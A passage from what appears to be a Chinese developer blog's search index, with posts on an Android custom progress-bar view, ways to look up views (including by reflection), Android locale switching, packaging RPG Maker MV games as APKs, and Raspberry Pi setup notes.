typedArray.getColor(R.styleable.LineProgressBarView_color_a,Color.parseColor(\"#FF6059\"));\n\t        color_b = typedArray.getColor(R.styleable.LineProgressBarView_color_b,Color.parseColor(\"#41CFFF\"));\n\t        bar_height = typedArray.getDimension(R.styleable.LineProgressBarView_bar_height,30f);\n\t        bar_width = typedArray.getDimension(R.styleable.LineProgressBarView_bar_width,0);\n\t        margin = typedArray.getInteger(R.styleable.LineProgressBarView_margin,dp2px(30));\n\t        num_a = typedArray.getFloat(R.styleable.LineProgressBarView_num_a,40);\n\t        num_b = typedArray.getFloat(R.styleable.LineProgressBarView_num_b,40);\n\t        type = typedArray.getInteger(R.styleable.LineProgressBarView_bar_type,0);\n\t        typedArray.recycle();\n\t    }\n\t    protected int dp2px(int dpVal) {\n\t        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());\n\t    }\n\t    protected float dp2px(float dpVal) {\n\t        return (float) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());\n\t    }\n\t    private void initPaint() {\n\t        back_paint = getPaint(Paint.Style.FILL,background_color,bar_height);\n\t        back_paint.setStrokeCap(Paint.Cap.ROUND);\n\n\t        num_a_paint = getPaint(Paint.Style.FILL,color_a,bar_height);\n\t        num_a_paint.setColor(color_a);\n\t        num_b_paint = getPaint(Paint.Style.FILL,color_b,bar_height);\n\t        num_b_paint.setColor(color_b);\n\t    }\n\n\t    private Paint getPaint(Paint.Style style,int color,float width){\n\t        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志\n\t        paint.setStyle(style);\n\t        paint.setColor(color);\n\t        paint.setStrokeWidth(width);\n\t        paint.setAntiAlias(true);\n\t        return paint;\n\t    }\n\t    @Override\n\t    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n\t        super.onSizeChanged(w, h, oldw, oldh);\n\t        width = w;\n\t        height = h;\n\t        startX = margin;\n\t        endX = width-margin;\n\t    }\n\n\t    @Override\n\t    protected void onDraw(Canvas canvas) {\n\t        super.onDraw(canvas);\n\t        canvas.drawLine(startX,height/2,endX,height/2,back_paint); // 背景线\n\t        // -><-\n\t        // 从两边往中间画\n\t        float length_a = (endX*num_a/100)+startX-(num_a/100*(startX));\n\t        float length_b = (startX*num_b/100)+endX-(num_b/100*(endX));\n\t        num_a_paint.setStrokeCap(Paint.Cap.ROUND);\n\t        canvas.drawLine(startX, height / 2, startX + 2, height / 2, num_a_paint);\n\t        num_a_paint.setStrokeCap(Paint.Cap.BUTT);\n\t        canvas.drawLine(startX, height / 2, length_a, height / 2, num_a_paint);\n\t        num_b_paint.setStrokeCap(Paint.Cap.ROUND);\n\t        canvas.drawLine(endX, height / 2, endX - 2, height / 2, num_b_paint);\n\t        num_b_paint.setStrokeCap(Paint.Cap.BUTT);\n\t        canvas.drawLine(endX, height / 2, length_b - 2, height / 2, num_b_paint);\n\t    }\n\n\t    public void setNumAProgress(final int xx) {\n\t        final ValueAnimator anim = ValueAnimator.ofFloat(0,xx);\n\t        anim.setDuration(2000);\n\t        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n\t            @Override\n\t            public void onAnimationUpdate(ValueAnimator animator) {\n\t                num_a  = (float) animator.getAnimatedValue();\n\t                invalidate();\n\t            }\n\t        });\n\t        anim.start();\n\t    }\n\t    public void setNumBProgress(final int xx) {\n\t        final ValueAnimator anim = ValueAnimator.ofFloat(0,xx);\n\t        anim.setDuration(2000);\n\t        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n\t            @Override\n\t            public void onAnimationUpdate(ValueAnimator animator) {\n\t                num_b  = (float) animator.getAnimatedValue();\n\t                invalidate();\n\t            }\n\t        });\n\t        anim.start();\n\t    }\n\n\t}\n\n[LineProgressBarView.java](https://github.com/tea9/android_view/blob/master/app/src/main/java/com/demo/android_view/mview/LineProgressBarView.java)  \n\n---\n\n![效果图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/02.jpg)\n\n## 思路 \n这个是跟上面图方向不一样的线，然后采用的先画方头的2px宽的，然后用圆头补全。  \n\n\n## 关键代码\n\n\tnum_a_paint.setStrokeCap(Paint.Cap.BUTT);\n\tcanvas.drawLine(centre, height / 2, length_a, height / 2, num_a_paint);\n\tnum_a_paint.setStrokeCap(Paint.Cap.ROUND);\n\tcanvas.drawLine(length_a+2, height / 2, length_a, height / 2, num_a_paint);\n\tnum_b_paint.setStrokeCap(Paint.Cap.BUTT);\n\tcanvas.drawLine(centre, height / 2, length_b, height / 2, num_b_paint);\n\tnum_b_paint.setStrokeCap(Paint.Cap.ROUND);\n\tcanvas.drawLine(length_b, height / 2, length_b+2, height / 2, num_b_paint);\n\n## 全部代码\n\n跟上面的代码差不多 加了个type值作为判断。  \n\n\tpublic class LineProgressBarView extends View {\n\n\t    private Context context;\n\t    private int background_color,color_a,color_b,margin; // margin 左右边距\n\t    private float bar_height,bar_width;\n\t    private float num_a,num_b;\n\t    private Paint back_paint,num_a_paint,num_b_paint;\n\t    private int width,height;\n\t    private int type;\n\t    // 线的X起始左标\n\t    private float startX;\n\t    private float endX;\n\t    public LineProgressBarView(Context context, @Nullable AttributeSet attrs) {\n\t        super(context, attrs);\n\t        this.context = context;\n\t        getAtt(attrs);\n\t        initPaint();\n\t        setLayerType(View.LAYER_TYPE_SOFTWARE, null); // 硬件加速\n\t    }\n\t    private void getAtt(AttributeSet attrs) {\n\t        TypedArray typedArray = context.obtainStyledAttributes(attrs,R.styleable.LineProgressBarView);\n\t        background_color = typedArray.getColor(R.styleable.LineProgressBarView_background_color,Color.parseColor(\"#E3E2E2\"));\n\t        color_a = typedArray.getColor(R.styleable.LineProgressBarView_color_a,Color.parseColor(\"#FF6059\"));\n\t        color_b = typedArray.getColor(R.styleable.LineProgressBarView_color_b,Color.parseColor(\"#41CFFF\"));\n\t        bar_height = typedArray.getDimension(R.styleable.LineProgressBarView_bar_height,30f);\n\t        bar_width = typedArray.getDimension(R.styleable.LineProgressBarView_bar_width,0);\n\t        margin = typedArray.getInteger(R.styleable.LineProgressBarView_margin,dp2px(30));\n\t        num_a = typedArray.getFloat(R.styleable.LineProgressBarView_num_a,40);\n\t        num_b = typedArray.getFloat(R.styleable.LineProgressBarView_num_b,40);\n\t        type = typedArray.getInteger(R.styleable.LineProgressBarView_bar_type,0);\n\t        typedArray.recycle();\n\t    }\n\t    protected int dp2px(int dpVal) {\n\t        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());\n\t    }\n\t    protected float dp2px(float dpVal) {\n\t        return (float) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());\n\t    }\n\t    private void initPaint() {\n\t        back_paint = getPaint(Paint.Style.FILL,background_color,bar_height);\n\t        back_paint.setStrokeCap(Paint.Cap.ROUND);\n\n\t        num_a_paint = getPaint(Paint.Style.FILL,color_a,bar_height);\n\t        num_a_paint.setColor(color_a);\n\t        num_b_paint = getPaint(Paint.Style.FILL,color_b,bar_height);\n\t        num_b_paint.setColor(color_b);\n\t    }\n\n\t    private Paint getPaint(Paint.Style style,int color,float width){\n\t        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志\n\t        paint.setStyle(style);\n\t        paint.setColor(color);\n\t        paint.setStrokeWidth(width);\n\t        paint.setAntiAlias(true);\n\t        return paint;\n\t    }\n\t    @Override\n\t    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n\t        super.onSizeChanged(w, h, oldw, oldh);\n\t        width = w;\n\t        height = h;\n\t        startX = margin;\n\t        endX = width-margin;\n\t    }\n\n\t    @Override\n\t    protected void onDraw(Canvas canvas) {\n\t        super.onDraw(canvas);\n\t        canvas.drawLine(startX,height/2,endX,height/2,back_paint); // 背景线\n\t        if (type==0) {\n\n\t            // -><-\n\t            // 从两边往中间画\n\t            float length_a = (endX*num_a/100)+startX-(num_a/100*(startX));\n\t            float length_b = (startX*num_b/100)+endX-(num_b/100*(endX));\n\t            num_a_paint.setStrokeCap(Paint.Cap.ROUND);\n\t            canvas.drawLine(startX, height / 2, startX + 2, height / 2, num_a_paint);\n\t            num_a_paint.setStrokeCap(Paint.Cap.BUTT);\n\t            canvas.drawLine(startX, height / 2, length_a, height / 2, num_a_paint);\n\t            num_b_paint.setStrokeCap(Paint.Cap.ROUND);\n\t            canvas.drawLine(endX, height / 2, endX - 2, height / 2, num_b_paint);\n\t            num_b_paint.setStrokeCap(Paint.Cap.BUTT);\n\t            canvas.drawLine(endX, height / 2, length_b - 2, height / 2, num_b_paint);\n\t        } else if (type == 1){\n\t            //<-|->\n\t            // 从中间往两边画\n\t            float centre=(endX-startX)/2+margin;\n\t            float length_a = (startX*num_b/100)+centre-(num_b/100*(centre));\n\t            float length_b = (endX*num_a/100)+centre-(num_a/100*(centre));\n\t            num_a_paint.setStrokeCap(Paint.Cap.BUTT);\n\t            canvas.drawLine(centre, height / 2, length_a, height / 2, num_a_paint);\n\t            num_a_paint.setStrokeCap(Paint.Cap.ROUND);\n\t            canvas.drawLine(length_a+2, height / 2, length_a, height / 2, num_a_paint);\n\t            num_b_paint.setStrokeCap(Paint.Cap.BUTT);\n\t            canvas.drawLine(centre, height / 2, length_b, height / 2, num_b_paint);\n\t            num_b_paint.setStrokeCap(Paint.Cap.ROUND);\n\t            canvas.drawLine(length_b, height / 2, length_b+2, height / 2, num_b_paint);\n\t        }\n\n\t    }\n\n\t    public void setNumAProgress(final int xx) {\n\t        final ValueAnimator anim = ValueAnimator.ofFloat(0,xx);\n\t        anim.setDuration(2000);\n\t        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n\t            @Override\n\t            public void onAnimationUpdate(ValueAnimator animator) {\n\t                num_a  = (float) animator.getAnimatedValue();\n\t                invalidate();\n\t            }\n\t        });\n\t        anim.start();\n\t    }\n\t    public void setNumBProgress(final int xx) {\n\t        final ValueAnimator anim = ValueAnimator.ofFloat(0,xx);\n\t        anim.setDuration(2000);\n\t        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n\t            @Override\n\t            public void onAnimationUpdate(ValueAnimator animator) {\n\t                num_b  = (float) animator.getAnimatedValue();\n\t                invalidate();\n\t            }\n\t        });\n\t        anim.start();\n\t    }\n\n\t    public void setType(int type) {\n\t        this.type = type;\n\t        invalidate();\n\t    }\n\t}\n\n[RingProgressBarView.java](https://github.com/tea9/android_view/blob/master/app/src/main/java/com/demo/android_view/mview/RingProgressBarView.java)  \n\n---\n\n## 调用\n\nactivity_line_progress_bar.xml  \n\n\t<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\t              android:orientation=\"vertical\"\n\t                                             xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n\t                                             android:layout_width=\"match_parent\"\n\t                                             android:layout_height=\"match_parent\">\n\n\t    <Button android:id=\"@+id/switch_type_btn\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\"\n\t    android:text=\"切换type\"/>\n\t    <com.demo.android_view.mview.LineProgressBarView\n\t            android:id=\"@+id/lll\"\n\t            android:layout_width=\"match_parent\"\n\t            app:bar_type=\"0\"\n\t            android:layout_height=\"wrap_content\"/>\n\t</LinearLayout>\n\nLineProgressBarActivity.java  \n\n\tpublic class LineProgressBarActivity extends AppCompatActivity {\n\n\t    private LineProgressBarView lll;\n\t    private Button switch_type_btn;\n\t    private int type = 0;\n\n\t    @Override\n\t    protected void onCreate(@Nullable Bundle savedInstanceState) {\n\t        super.onCreate(savedInstanceState);\n\t        setContentView(R.layout.activity_line_progress_bar);\n\t        switch_type_btn = findViewById(R.id.switch_type_btn);\n\t        lll = findViewById(R.id.lll);\n\t        lll.setNumAProgress(40);\n\t        lll.setNumBProgress(40);\n\n\t        switch_type_btn.setOnClickListener(new View.OnClickListener() {\n\t            @Override\n\t            public void onClick(View view) {\n\t                lll.setType(type==0?1:0);\n\t                if (type==0) type = 1; else type = 0;\n\t            }\n\t        });\n\t    }\n\t}\n\n## 源代码\n[源代码](https://github.com/tea9/android_view)  \n\n## LINKS\n\n[自定义View之线性百分比进度条](https://blog.csdn.net/qq_38367802/article/details/77566102)  \n[自定义View实现进度条](https://blog.csdn.net/qq_31179919/article/details/52596965)  \n[Android 实现一个蛮酷的加载进度条](https://juejin.im/entry/585a6b80ac502e006711fa8d)  \n[Android绘图总结（Bitmap，Canvas，Paint，圆角）](https://blog.csdn.net/xuewater/article/details/45247885)  \n[一个功能强大的自定义SeekBar](https://www.sohu.com/a/203382364_659256)  \n[Android自定义控件三部曲文章索引](https://blog.csdn.net/harvic880925/article/details/50995268)  \n","tags":["android"],"categories":["android"]},{"title":"android获取控件的几种方法","url":"/post/2048223897.html","content":"\nlayout  \n\n\t<RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\t    android:layout_width=\"match_parent\"\n\t    android:background=\"@color/colorPrimary\"\n\t    android:layout_height=\"wrap_content\">\n\t    <TextView\n\t        android:id=\"@+id/item_tv\"\n\t        android:layout_width=\"wrap_content\"\n\t        android:layout_height=\"wrap_content\"\n\t        android:layout_centerInParent=\"true\"\n\t        android:textSize=\"25sp\" />\n\t</RelativeLayout>\n\n\n## 0x01 findViewById\n\n\tprivate TextView item_tv;\n\n\titem_tv = findViewById(R.id.item_tv);\n\titem_tv.setText(\"text1\");\n\n## 0x02 getResources().getIdentifier()\n\n\tint viewId = getResources().getIdentifier(\"item_tv\", \"id\", getPackageName());\n\tTextView textView =findViewById(viewId);\n\ttextView.setText(\"text2\");\n\n## 0x03 getField()\n\n\ttry {\n\t    Field field = R.id.class.getField(\"item_tv\");\n\t    TextView textView = findViewById(field.getInt(null));\n\t    textView.setText(\"text3\");\n\n\t} catch (NoSuchFieldException e) {\n\t    e.printStackTrace();\n\t} catch (IllegalAccessException e) {\n\t    e.printStackTrace();\n\t}\n\n## 0x04 通过反射\n\n    java反射机制\n        获取类的方式:(1)class.forName(\"类名\"),(2)类名().getClass(),(3)类名.class;\n        Constructor类:\n            getConstuctor()返回class的构造函数;\n            getConstructors()返回class类的所有构造方法;\n            getDelaredConstructor()返回class类或接口指定的构造函数;\n            getDelaredConstructors()返回所有class类或接口指定的构造函数;\n            getEnclosingConstructor()返回class类的构造方法中的一个本地或匿名类;\n            getModifiers()返回对象的java修饰符;\n            getName()以字符串的形式返回构造方法的名称;\n            newInstance()实例化对象;\n        getDeclaredFields()获取本类的全部属性;\n        getMethod()获取类中的方法对象;\n        Field类:\n            获取反射字段的方式:getDeclaredField(),getFields();\n            getName()获取字段名;\n            getType()获取字段类型;\n            get()获取字段的值;\n            set()设置字段的值;\n\n\ttry {\n\t        Class stuClass = Class.forName(\"com.example.homepage.activity.HH\");\n\t        Field file = stuClass.getDeclaredField(\"item_tv\"); // 通过反射获取item_tv对象\n\t        file.setAccessible(true);\n\t        TextView textView = (TextView) file.get(this); // 获取textView实例\n\t        textView.setText(\"text4\");\n\t        file.set(this,textView);\n\t    } catch (Exception e) {\n\t        e.printStackTrace();\n\t    }\n\t}\n\n## code\n\n[code](https://github.com/tea9/dear_kotlin_code/blob/master/homepage/src/main/java/com/example/homepage/activity/HH.java)  \n\n## others\n一些测试代码  \n\n            try {\n    //            Field field = R.id.class.getField(\"header_tv\");\n                Class stuClass = Class.forName(\"com.jwenfeng.library.pulltorefresh.view.HeadRefreshView\");\n    //            Class stuClass = Class.forName(\"com.jwenfeng.library.pulltorefresh.PullToRefreshLayout\");\n    //            Field f = stuClass.getDeclaredField(\"header_tv\");\n    //            f.setAccessible(true);\n    //\n    //            TextView textView = findViewById(f.getInt(null));\n    //            Log.e(\"tea\",textView.getText().toString());\n    //            textView.setText(\"zezeze\");\n    //            HeadRefreshView view = (HeadRefreshView) stuClass.newInstance();\n    //            Field[] fieldArray = stuClass.getFields(); // 不包括私有参数\n    //            Field[] fieldArray = stuClass.getDeclaredFields(); //私有参数\n    //            for(Field f : fieldArray){\n    //                Log.e(\"tea\", String.valueOf(f));\n    //            }\n                Field file = stuClass.getDeclaredField(\"tv\");\n                file.setAccessible(true);\n    //            Log.e(\"tea\", String.valueOf(file));\n                HeadRefreshView view = new HeadRefreshView(this);\n                TextView nameStr = (TextView) file.get(view);\n                Log.e(\"tea\", nameStr.getText().toString());\n                nameStr.setText(\"tea9\");\n    //            nameStr.setVisibility(View.GONE);\n    //            TextView textView = new TextView(this);\n    //            textView.setVisibility(View.GONE);\n    //            textView.setText(\"tea0\");\n    //            file.set(view, nameStr);\n    //            Constructor<?>[] constructor = stuClass.getConstructors(); //构造方法\n    //            for (int i = 0; i < constructor.length; i++) {\n    ////                Log.e(\"tea\", constructor[i].toString());\n    //            }\n    //            Method[] methods = stuClass.getDeclaredMethods(); // 获取声明的方法\n    //            for (int i = 0; i < methods.length; i++) {\n    ////                Log.e(\"tea\", methods[i].toString());\n    //            }\n                Method m2 = stuClass.getDeclaredMethod(\"getView\");\n                View view1 = (View) m2.invoke(view);\n                TextView textView1 = view1.findViewById(R.id.header_tv);\n                textView1.setVisibility(View.GONE);\n                textView1.setText(\"tea8\");\n                file.set(view1, textView1);\n    //            Log.e(\"tea1\", textView1.getText().toString());\n    //            TextView nameStr1 = (TextView) file.get(view);\n    //            Log.e(\"tea\", nameStr1.getText().toString());\n\n            }  catch (Exception e) {\n                e.printStackTrace();\n                Log.e(\"tea\", \"错误了\");\n            }\n\n    //        int viewId = getResources().getIdentifier(\"tv\", \"id\", \"com.jwenfeng.library.pulltorefresh\");\n    //        TextView textView = (TextView)findViewById(viewId);\n    //        textView.setText(\"sss\");\n\n\n## LINKS\n\n[リフレクションを使って文字列からリソースIDを取得する](https://qiita.com/1plus4/items/9f273b26945a8659d441)  \n[JAVA反射](https://www.jianshu.com/p/5c9bc53556b8)  \n[Java Reflection(反射机制)详解](https://www.jianshu.com/p/2315dda64ad2)  \n[Java 反射 使用总结](https://www.cnblogs.com/zhaoyanjun/p/6074887.html)  \n[关于Android中根据ID名动态获取资源的两个方法](https://blog.csdn.net/stzy00/article/details/41079907)  \n[Android利用资源名称获取其ID(一)--->getIdentifier()](https://blog.csdn.net/lfdfhl/article/details/21017889)  ","tags":["android"],"categories":["android"]},{"title":"Android7.0国际化适配代码","url":"/post/1613027305.html","content":"\nApplication.java  \n\n    /**\n     * 设置国家语言\n     * @param language\n     */\n    public static void selectLanguage(Context minContext , String language) {\n        Log.i(\"cs\",\"selectLanguage=\"+language);\n        Locale targetLocale = null;\n        switch (language) {\n            case \"en_us\": //英语\n                targetLocale = Locale.ENGLISH;\n                break;\n            case \"zh_cn\": //简体中文\n                targetLocale = Locale.SIMPLIFIED_CHINESE;\n                break;\n            case \"zh_tw\": //繁体中文\n                targetLocale = Locale.TAIWAN;\n                break;\n            default: //默认繁体\n                targetLocale = Locale.TAIWAN;\n                //targetLocale = Locale.getDefault();\n                Log.i(\"cs\",\"进入了默认语言\"+language);\n                break;\n        }\n        Configuration configuration = context.getResources().getConfiguration();\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {\n            configuration.setLocale(targetLocale);\n        } else {\n            configuration.locale = targetLocale;\n        }\n        Resources resources = context.getResources();\n        DisplayMetrics dm = resources.getDisplayMetrics();\n        resources.updateConfiguration(configuration, dm);//语言更换生效的代码!\n        //保存设置语言的类型\n        SharedPreferencesUtils.putInfo(context,\"language\", language);\n    }\n\nBaseActivity.java  \n\n    @Override\n    protected void attachBaseContext(Context context) {\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n            String language = SharedPreferencesUtils.getPreferences(this).getString(\"language\",\"\");\n            Locale targetLocale = null;\n            switch (language) {\n                case \"en_us\": //英语\n                    targetLocale = Locale.ENGLISH;\n                    break;\n                case \"zh_cn\": //简体中文\n                    targetLocale = Locale.SIMPLIFIED_CHINESE;\n                    break;\n                case \"zh_tw\": //繁体中文\n                    targetLocale = Locale.TAIWAN;\n                    break;\n                default: //默认繁体\n                    targetLocale = Locale.TAIWAN;\n                    //targetLocale = Locale.getDefault();\n                    Log.i(\"cs\",\"进入了默认语言\"+language);\n                    break;\n            }\n            Resources resources = context.getResources();\n            Configuration configuration = resources.getConfiguration();\n            Locale locale=targetLocale;\n            configuration.setLocale(locale);\n            context = context.createConfigurationContext(configuration);\n        } else {\n            // 这里是调用\n            MyApplication.selectLanguage(this,SharedPreferencesUtils.getPreferences(this).getString(\"language\",\"\"));\n        }\n        super.attachBaseContext(context);\n    }\n\n---\n\n别人写的帮助类  \n\n    public class MultiLanguageUtil {\n\n        private static final String TAG = \"MultiLanguageUtil\";\n        private static MultiLanguageUtil instance;\n        private Context mContext;\n        public static final String SAVE_LANGUAGE = \"save_language\";\n\n        public static void init(Context mContext) {\n            if (instance == null) {\n                synchronized (MultiLanguageUtil.class) {\n                    if (instance == null) {\n                        instance = new MultiLanguageUtil(mContext);\n                    }\n                }\n            }\n        }\n\n        public static MultiLanguageUtil getInstance() {\n            if (instance == null) {\n                throw new IllegalStateException(\"You must be init MultiLanguageUtil first\");\n            }\n            return instance;\n        }\n\n        private MultiLanguageUtil(Context context) {\n            this.mContext = context;\n        }\n\n        /**\n         * 设置语言\n         */\n        public void setConfiguration() {\n            Locale targetLocale = getLanguageLocale();\n            Configuration configuration = mContext.getResources().getConfiguration();\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {\n                configuration.setLocale(targetLocale);\n            } else {\n                configuration.locale = targetLocale;\n            }\n                Resources resources = mContext.getResources();\n                DisplayMetrics dm = resources.getDisplayMetrics();\n                resources.updateConfiguration(configuration, dm);//语言更换生效的代码!\n        }\n\n        /**\n         * 如果不是英文、简体中文、繁体中文，默认返回简体中文\n         *\n         * @return\n         */\n        private Locale getLanguageLocale() {\n            int languageType = CommSharedUtil.getInstance(mContext).getInt(MultiLanguageUtil.SAVE_LANGUAGE, 0);\n            if (languageType == LanguageType.LANGUAGE_FOLLOW_SYSTEM) {\n                Locale sysLocale= getSysLocale();\n                return sysLocale;\n            } else if (languageType == LanguageType.LANGUAGE_EN) {\n                return Locale.ENGLISH;\n            } else if (languageType == LanguageType.LANGUAGE_CHINESE_SIMPLIFIED) {\n                return Locale.SIMPLIFIED_CHINESE;\n            } else if (languageType == LanguageType.LANGUAGE_CHINESE_TRADITIONAL) {\n                return Locale.TRADITIONAL_CHINESE;\n            }\n            getSystemLanguage(getSysLocale());\n            Log.e(TAG, \"getLanguageLocale\" + languageType + languageType);\n            return Locale.SIMPLIFIED_CHINESE;\n        }\n\n        private String getSystemLanguage(Locale locale) {\n            return locale.getLanguage() + \"_\" + locale.getCountry();\n\n        }\n\n        //以上获取方式需要特殊处理一下\n        public Locale getSysLocale() {\n            Locale locale;\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                locale = LocaleList.getDefault().get(0);\n            } else {\n                locale = Locale.getDefault();\n            }\n            return locale;\n        }\n\n        /**\n         * 更新语言\n         *\n         * @param languageType\n         */\n        public void updateLanguage(int languageType) {\n            CommSharedUtil.getInstance(mContext).putInt(MultiLanguageUtil.SAVE_LANGUAGE, languageType);\n            MultiLanguageUtil.getInstance().setConfiguration();\n            EventBus.getDefault().post(new OnChangeLanguageEvent(languageType));\n        }\n\n        public String getLanguageName(Context context) {\n            int languageType = CommSharedUtil.getInstance(context).getInt(MultiLanguageUtil.SAVE_LANGUAGE,LanguageType.LANGUAGE_FOLLOW_SYSTEM);\n            if (languageType == LanguageType.LANGUAGE_EN) {\n                return mContext.getString(R.string.setting_language_english);\n            } else if (languageType == LanguageType.LANGUAGE_CHINESE_SIMPLIFIED) {\n                return mContext.getString(R.string.setting_simplified_chinese);\n            } else if (languageType == LanguageType.LANGUAGE_CHINESE_TRADITIONAL) {\n                return mContext.getString(R.string.setting_traditional_chinese);\n            }\n            return mContext.getString(R.string.setting_language_auto);\n        }\n\n        /**\n         * 获取到用户保存的语言类型\n         * @return\n         */\n        public int getLanguageType() {\n            int languageType = CommSharedUtil.getInstance(mContext).getInt(MultiLanguageUtil.SAVE_LANGUAGE, LanguageType.LANGUAGE_FOLLOW_SYSTEM);\n             if (languageType == LanguageType.LANGUAGE_CHINESE_SIMPLIFIED) {\n                return LanguageType.LANGUAGE_CHINESE_SIMPLIFIED;\n            } else if (languageType == LanguageType.LANGUAGE_CHINESE_TRADITIONAL) {\n                return LanguageType.LANGUAGE_CHINESE_TRADITIONAL;\n            } else if (languageType == LanguageType.LANGUAGE_FOLLOW_SYSTEM) {\n               return LanguageType.LANGUAGE_FOLLOW_SYSTEM;\n            }\n            Log.e(TAG, \"getLanguageType\" + languageType);\n            return languageType;\n        }\n\n        public static Context attachBaseContext(Context context) {\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                return createConfigurationResources(context);\n            } else {\n                MultiLanguageUtil.getInstance().setConfiguration();\n                return context;\n            }\n        }\n\n        @TargetApi(Build.VERSION_CODES.N)\n        private static Context createConfigurationResources(Context context) {\n            Resources resources = context.getResources();\n            Configuration configuration = resources.getConfiguration();\n            Locale locale=getInstance().getLanguageLocale();\n            configuration.setLocale(locale);\n            return context.createConfigurationContext(configuration);\n        }\n    }\n\n## LINKS\n\n[记APP实现多语言（国际化）过程，兼容Android 8.0以上](https://blog.csdn.net/finddreams/article/details/78470768?utm_source=tuicool&utm_medium=referral)  \n[Android国际化(多语言)实现，支持8.0+](https://www.jianshu.com/p/163db59d0774)  \n[MultiLanguages](https://github.com/MichaelJokAr/MultiLanguages)  \n[AndroidMultiLanguage](https://github.com/finddreams/AndroidMultiLanguage)  \n","tags":["android"],"categories":["android"]},{"title":"RPGMakerMV安卓版本打包","url":"/post/683201593.html","content":"\n## 前言：\n1. 部署项目\n文件-部署-Android/IOS  \n![打包项目](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png)\n![www文件目录](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png)  \n\n## 方式一：Website2APK\n1.下载工具  \n[下载地址](https://pan.baidu.com/s/1eSQ65Lg)  \n密码：vqv5  \n\n2.基本配置  \n选择Local HTML Website - 然后选择Directory of Local Website-GENERATE APK    \n![打包配置](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/21/01.png)  \n\n## 方式二：HTML一键打包工具\n\n1.工具  \n[下载地址](https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&errmsg=Auth%20Login%20Sucess&&bduss=&ssnerror=0&traceid=)  \n\n2.安装HTML一键打包工具  \n路径选择为www下index.html  \n![打包配置](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png)  \n\ntips:  \n免费版不能修改icon和包名  \n\n\n## 注意事项\n\n1.文件名不要中文  \n2.项目中不能含有中文的名称  \n\n## LINKS\n\n[RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)](https://blog.csdn.net/u012416063/article/details/81264317)  \n[RpgMv游戏最简单打包apk教程，小白福利](https://www.bilibili.com/video/av19033912)  \n","tags":["rpgmakermv","rpg"],"categories":["rpgmakermv"]},{"title":"树莓派笔记","url":"/post/2224320310.html","content":"\n## 更新系统&关机&重启\n\n\tsudo apt-get update && sudo apt-get upgrade\n\n关机  \n\n\tsudo shutdown -h now\n\tsudo halt\n\tsudo poweroff\n\tsudo init 0\n\n重启  \n\n\tsudo reboot\n\tshutdown -r now\n\tshutdown -r 18:23:52 #定时重启在18点23分52秒关闭\n\n## 树莓派固定ip\n\n\tvi /etc/dhcpcd.conf\n\n添加配置项  \n\t\n\tinterface eth0 # 指定接口 eth0\n\t\n\tstatic ip_address=192.168.1.20/24 # 指定静态IP，/24表示子网掩码为 255.255.255.0\n\t\n\tstatic routers=192.168.1.1 # 路由器/网关IP地址\n\t\n\tstatic domain_name_servers=114.114.114.114 # 手动自定义DNS服务器\n\n保存之后重启  \n\n\tsudo reboot\n\n**另外注意配置时，你的静态IP一定要和你的路由器网段一致**。\n\n\n## 树莓派SSH连接\n默认账号：pi   密码：raspberry  \n\n\tssh root@172.26.4.214\n\n\tssh pi@172.26.4.214\n\n\n\n## 树莓派VNC（远程连接）\n开启VNC  \n\t\n\tsudo raspi-config\n\n![vnc](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/22/01.png) \n![vnc](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/22/02.png) \n\n\nwin：\n下载vnc连接软件\n[链接:](https://pan.baidu.com/s/10A0iSWmXUJedNLfbist8ug)  \n密码:vzxy\n\n输入ip密码连接\n\n\n## 树莓派连接 xrdp\n\n树莓派：  \n\n\tsudo apt-get install xrdp\n\nwin：\nWIN+R - mstsc\n输入ip密码连接\n\n\n## 树莓派连接摄像头\n\n配置  \n\n![vnc](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/22/03.png) \n![vnc](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/22/04.png) \n\n拍摄照片  \n\n\traspistill -o cam.jpg\n\n拍摄视频  \n\n\traspivid -o vid.h264\n\n\npython3  \ncamera.py  \n\n\tfrom picamera import PiCamerafrom time import sleep \n\tcamera = PiCamera()\n\tcamera.start_preview()\n\tsleep(10)\n\tcamera.stop_preview()\n\n\n拍摄照片\n\n\tcamera.start_preview()\n\tsleep(5) \n\tcamera.capture('/home/pi/Desktop/image.jpg') \n\tcamera.stop_preview()\n\n录制视频  \n\n\tcamera.start_preview() \n\tcamera.start_recording('/home/pi/video.h264') \n\tsleep(10)\n\tcamera.stop_recording()\n\tcamera.stop_preview()\n\n\n\n\tvcgencmd get_camera\n\tvim 